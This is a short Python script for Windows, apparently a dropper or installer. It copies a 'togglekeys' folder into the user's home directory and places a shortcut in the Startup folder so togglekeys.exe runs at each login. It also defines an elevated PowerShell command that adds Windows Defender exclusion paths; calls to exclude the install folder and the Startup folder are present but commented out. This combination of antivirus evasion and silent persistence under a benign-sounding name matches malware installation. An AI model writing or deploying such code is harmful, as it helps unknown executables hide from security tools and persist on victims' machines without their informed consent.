import os
import win32com.client

username = os.getlogin()
pa = f"C:\\Users\\{username}"
os.system(f"xcopy \"togglekeys\" \"{pa}\" /s /e")
os.chdir(os.path.join(pa, "togglekeys"))

def get_command(path):
    return f'powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList \'-Command \"Add-MpPreference -ExclusionPath \\"{path}\\"\"\'"'

#os.system(get_command(os.getcwd()))
#os.system(get_command(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start`Menu\Programs\Startup"))

#AI_generated_code
exe_path = os.path.join(os.getcwd(), r"togglekeys.exe")
startup_path = os.path.join(rf"C:\Users\{username}\AppData\Roaming", r'Microsoft\Windows\Start Menu\Programs\Startup')
shortcut_name = "togglekeys.lnk"
shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(os.path.join(startup_path, shortcut_name))
shortcut.Targetpath = exe_path
shortcut.save()